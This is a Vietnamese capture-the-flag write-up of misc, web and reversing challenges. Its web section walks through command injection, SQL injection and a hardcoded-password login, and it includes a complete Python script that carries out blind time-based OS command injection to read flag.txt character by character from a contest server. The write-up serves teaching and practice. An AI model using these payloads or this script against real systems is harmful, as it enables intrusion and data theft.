# Write-up:
# MISC 
## amongus
Bấm Ctrl+U để đọc source. Có khá nhiều đường dẫn, khi xem gần hết source sẽ có 1 dòng khá giống hint:
![](https://hackmd.io/_uploads/SJApL_Jnn.png)

Cover image của AmongUs chính là ảnh này:
![](https://hackmd.io/_uploads/H1MMwdJ3h.png)

Sau khi tải ảnh về, dùng tool xem thử metadata để tìm manh mối. Và flag đã xuất hiện ngay trong đó:
![](https://hackmd.io/_uploads/B1tqv_1n2.png)


## Kevin
Theo như tên challenge thì đây nó sẽ liên quan đến steganography. Sau khi truy cập challenge , chúng ta để ý thấy 1 ảnh khác với còn lại. 

Ctrl+U sẽ thấy rằng file đó có tên là kevin

![](https://hackmd.io/_uploads/r1uXKu1nn.png)

"what's this LSB" - Least Significant Bit là 1 kỹ thuật che giấu dữ liệu trong Steganography cho phép giấu thông tin mà không làm thay đổi chất lượng hình ảnh bằng cách đổi những bit ít quan trọng nhất.

Tiếp theo chúng ta chỉ việc tải ảnh về và tìm 1 tool decode LSB bất kì là có thể thu được flag
![](https://hackmd.io/_uploads/ByRDc_knh.png)


## Blank and Empty
Đây là 1 bài misc dạng crypto. File txt được tải về nhìn như không có gì nhưng khi bôi đen lại có khác biệt rõ ràng 

![](https://hackmd.io/_uploads/Hy6miu133.png)

Do đã từng gặp qua nên mình biết đây là dạng encode WhiteSpace Language. Sử dụng dcode để decode:
![](https://hackmd.io/_uploads/r16Aoukh3.png)


# WEB

## My boss left
### Recon
Trang web này cho phép người dùng đăng nhập khi mà **password = valid_password** mà valid_password lại được lưu ngay trên source và không hề check username.

**valid_password = 'dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk';**
![](https://hackmd.io/_uploads/HydlCdkh3.png)
### Exploit
Sử dụng BurpSuite trên request login, để trống username và nhập **password = dGhpcyBpcyBzb21lIGdpYmJlcmlzaCB0ZXh0IHBhc3N3b3Jk** (string ở trên) là sẽ login thành công và lấy được flag.


## Ping Pong
Một dạng command Injection
### Recon 
![](https://hackmd.io/_uploads/rJRb0512n.png)

![](https://hackmd.io/_uploads/H1296cJn2.png)

Trang web cho phép nhập hostname và sẽ ping liên tục 3 lần tới hostname đó trên terminal Linux.

### Exploit
+ Ở đây mình sẽ dùng burpsuite để thuận tiện cho việc theo dõi và exploit.
+ Hướng đi của bài sẽ là sử dụng command injection vào phần nhập hostname. Giờ chúng ta phải tìm cách tách payload của bản thân và lệnh ping để terminal có thể hiểu được.
+ Hướng thứ 1 là dùng "|" để nối 2 lệnh: ping -c 3 ... | payload
 
  Huớng thứ 2 là dùng linebreak (xuống dòng): ping -c 3 ... (new line) payload
+ Bài này sẽ sử dụng hướng thứ 2, sau khi ping đến 1 host bất kì (ví dụ 127.0.0.1) intercept request đó bằng BurpSuite. Ngoài dữ liệu được gửi đi: '**hostname=127.0.0.1**',  ta sẽ xuống dòng và dùng lệnh **ls -la** (list tất cả các file có trong thư mục)
### Flag
Trong kết quả trả về sẽ có file flag.txt, làm tương tự như trên nhưng thay ls -la bằng **cat flag.txt** sẽ thu được flag.




## Amongsus-api

### Recon

![](https://hackmd.io/_uploads/rJgqLBNTin.png)
- Đầu tiên khi vừa mới vào trong bài ta có thể thấy được một đoạn json được in ra cho người dùng ngoài ra thì không còn gì khác nên chúng ta sẽ phân tích source code

### Exploit

![](https://hackmd.io/_uploads/HJHl8ETih.png)

- Các import bao gồm request, jsonify cùng với đó là sử dụng database là sqlite3
- Đầu tiên kết nối với database rồi tạo bảng users với id, username, sus
- Ở hàm index đầu tiên ta có thể thấy một **anotation** là với route là '/' sử dụng phương thức **GET**
- Hàm **index()** trả về một đoạn json ngay khi ta vừa mới mở trang web lên nên hãy chuyển sang hàm khác
![](https://hackmd.io/_uploads/SJWzONpi3.png)
- Ở hàm thứ hai với route là **/signup** sử dụng phương thức **POST** việc sử dụng **url + /signup** sẽ không có hiệu quả do chúng ta đang sử dụng phương thức **GET** nên sẽ nhận về màn hình báo lỗi **method not support** không còn cách nào khác ta sẽ sử dụng postman (trên discord) theo như gợi ý của đề bài
- Cùng với đó ta phải đăng ký **username** và **password** để có thể thực hiện câu lệnh sql nữa
![](https://hackmd.io/_uploads/HkaDqE6ih.png)
- Ở hàm tiếp theo
![](https://hackmd.io/_uploads/SyzT5VTj3.png)
- Hàm login được điều hướng đến trang **/login** ta có thể thấy biến **username** và **password** được truyền đi bởi phương thức **POST** câu lệnh **SELECT** để lấy các data được lưu trữ trong database và tạo một token một các ngẫu nhiên bởi các ký tự ASCII in hoa và các số nếu như ta đăng nhập thành công ta sẽ được biết **token** của ta là gì
![](https://hackmd.io/_uploads/BJ0P3Naon.png)
- Giờ ta đã có **token** giờ là lúc đi đến trang **/account**
![](https://hackmd.io/_uploads/Syps2Epin.png)
- Sử dụng phương thức **GET** nhưng lần này ta phải lấy cả trường [Authorization](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) và bên trong trường Arthorization này cũng phải chứa "Bearer " đây chính là lúc postman tỏa sáng
![](https://hackmd.io/_uploads/HyPF64ajn.png)
- Giờ chỉ còn tìm cách để đọc flag thôi
![](https://hackmd.io/_uploads/SyypTVTj3.png)
- Giờ thì ta có thể thấy được để có thể đọc flag cần phải có sus là 1 trong khi ngay khi vừa mới tạo tài khoản ta có thể thấy rằng sus của tài khoản đã bị mặc định là 1 nên là không còn cách nào khác ta sẽ triển khai **sql injection** do dễ dàng thấy được rằng không có filter ở những chỗ nhạy cảm như là **username** hay **password** nên ta có thể dễ dàng triển khai **sql injection** ở phần **/account/update**
![](https://hackmd.io/_uploads/HJLrgHTjn.png)
- **sql injection** đã thành công và đừng quên việc gửi cả **Authorization** nhé
- Giờ ta chỉ còn việc đọc flag thôi

### Flag
![](https://hackmd.io/_uploads/SyCebHpo2.png)



## Ping Pong Under Maintenance
 ![](https://hackmd.io/_uploads/H1n58dRoh.png)

Qua việc nhìn tên đề bài mình có thể đoán được rằng bài này sẽ được khai khác bằng **command injection**

### Recon

 ![](https://hackmd.io/_uploads/rk6ND_Rj3.png)

- Ở trang chính, chúng ta có thể thấy rằng trang web cho phép người dùng kiểm tra kết nối với một trang web bằng cách sử dụng lệnh ping. Tuy nhiên, khi chúng ta thử:
 ![](https://hackmd.io/_uploads/BkGAwOAj2.png)
- Vậy ta có thể thấy rằng thay vì in ra output như bình thường thì nó lại in ra thông báo hệ thống đang được bảo trì và đang ngắt kết nối mạng nhưng khi ta thử những payload khác
 ![](https://hackmd.io/_uploads/HkWL__Aon.png)
- Ta có thể thấy được rằng các payload không hề bị filter nên là ta có thể thoải mái thực hiện các payload khác nhau nhưng không nhìn thấy kết quả vậy ta phải làm thế nào
- Khi mở source code lên ta có thể thấy bất kể chúng ta làm gì đi chăng nữa thì ta vẫn sẽ nhận được dòng thông báo là đang bảo trì server do biến output đã bị thay đổi khi kết thúc hàm **index()**
 ![](https://hackmd.io/_uploads/SyQpa_Rsn.png)

### Exploit
- Đầu tiên ta phải có một cách nào để chắc chắn rằng mọi câu lệnh ta chạy vào bên trong đều được thực hiện nhưng làm thế nào để biết được rằng các câu lệnh đã được chạy và được thực thi? Đây chính là lúc mà ta thực hiện [**Blind OS command injection with time delay**](https://www.youtube.com/watch?v=KbWn4L2dcHU&ab_channel=RanaKhalil) 
- Khái quát một chút ta sẽ sử dụng độ trễ của server phản hồi để chắc chắn rằng chúng ta đang thực hiện một câu lệnh "OS"
- Đầu tiên ta sẽ thử với payload như sau```hostname=; sleep 5;``` sử dụng burp suite để có thể quan sát kỹ hơn 
 ![](https://hackmd.io/_uploads/HyfmoOCoh.png)
- Ta có thể thấy request bị trả về với khoảng thời gian là  ![](https://hackmd.io/_uploads/SyO_iu0o3.png)
- Vậy làm thế nào để có thể đọc được file flag.txt đây ta sẽ viết một file script để lấy flag nói cách khác chính là **bruteforce** 
- Để có thể build được một file script thì ta cần hai thứ thứ nhất chính là làm thế nào để biết được các ký tự có trong file flag.txt sử dụng câu lệnh **OS** thứ hai làm thế nào để có thể in ra được ký tự đó và nhận về kết quả cuối cùng
- Ta sẽ sử dụng lệnh **cut** và lệnh **cat** để có thể làm được điều đó
 ![](https://hackmd.io/_uploads/HyHGpuAo2.png)
- Câu lệnh này có nghĩa là đọc file **api.py** rồi cut lấy ký tự đầu tiên của file **api.py**
- Vậy là ta có cách để có thể lấy được ký tự đầu tiên của file giờ là làm thế nào để có thể in nó ra một cách chính xác và sử dụng time delay để lấy được flag
- Nhưng như ta đã biết việc in ra kết quả của biến output là không thể khi mà biến output đã biến đổi thành đoạn văn bản ta không cần vậy làm thế nào để có thể chạy được script đây
- Ta đến hướng thứ hai chính là việc sử dụng **if else** trong bash để có thể thứ nhất là so sánh với ký hiệu được **cat** ứng với ký tự gì trong bản chữ cái và ta sẽ sử dụng câu lệnh sau
 ![](https://hackmd.io/_uploads/HkWLfKAjn.png)
- Ta có thể hiểu câu lệnh trên đang lấy ký tự đầu rồi so sánh với chữ "i" nếu giống nhau thì in ra 'same' nếu không thì in ra 'not same' vạy nếu như ta thay bằng sleep thì sao nếu như giống thì sleep 2 giây không giống thì không sleep
- Vậy giờ khi đã có trong tay hướng đi sao ta không bắt đầu vào code nhỉ?
 ```python=
import requests
import time 

CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-' # dùng để bruteforce

URL = 'http://34.130.180.82:59119/' # url của đề bài

FLAG = ''

proxies={"http":"http://127.0.0.1:8080"} #localhost

for index in range(1,50):
    print("[DEBUG] Đang bruteforce kí tự thứ ", index)
    for c in CHARSET:
        # Đây là payload exploit
        # Nếu đúng thì tui cho nó ngủ 2s
        # Nếu sai thì không ngủ
        INJECT = "; cmd=`cat flag.txt | cut -c {vitri}`; if [ $cmd = '{bruteforce}' ]; then sleep 2; else sleep 0; fi; #".format(
            vitri=index,
            bruteforce=c
        )
        # Sử dụng phương thức POST để có thể gửi dữ liệu đến url
        r = requests.post(URL, {'hostname': INJECT},proxies=proxies)
        thoi_gian_phan_hoi = r.elapsed.total_seconds()
        # Thì khi kết quả HTTP trả về, nó sẽ lưu vào .text của biến r
        #print("Tui đang thử kí tự thứ ",index," nè: ", c, "(time:",thoi_gian_phan_hoi,")")
        if thoi_gian_phan_hoi > 2:
            FLAG += c
            print("Tìm ra kí tự thứ ", index, "là ", c, "(FLAG:",FLAG,")")
            break

 ```
### Flag
 ![](https://hackmd.io/_uploads/HyH2mKAoh.png)


# Rev
## obfuscation
Đây là 1 dạng che giấu thông tin. Đoạn code quan trọng sẽ bắt đầu từ line 102:


![](https://hackmd.io/_uploads/HJesMKkhh.png)

![](https://hackmd.io/_uploads/ryETGYkhn.png)

Đến đây sẽ có rất nhiều strings dài và có vẻ như vô nghĩa nhưng thực ra chúng đã được encode (theo gợi ý đề bài là base64) , decode từng cái rất lâu nên mình nhờ chatGPT dịch các strings ra "human-readable data":
![](https://hackmd.io/_uploads/SJEK11ehh.png)
 Và flag nằm ngay dòng đầu tiên.


## rick
Đây là 1 file thực thi, khi chạy sẽ in ra dòng "wat ís flag". Sử dụng IDA để phân tích file trên, khi đi đến hàm main, ta thấy comment "wat is flag" và ở dưới là 1 string đáng ngờ:
![](https://hackmd.io/_uploads/Hyjjo9ehn.png)

Reverse string này sẽ thu được flag
![](https://hackmd.io/_uploads/SygTjql23.png)

                               --- THE END ---

# 
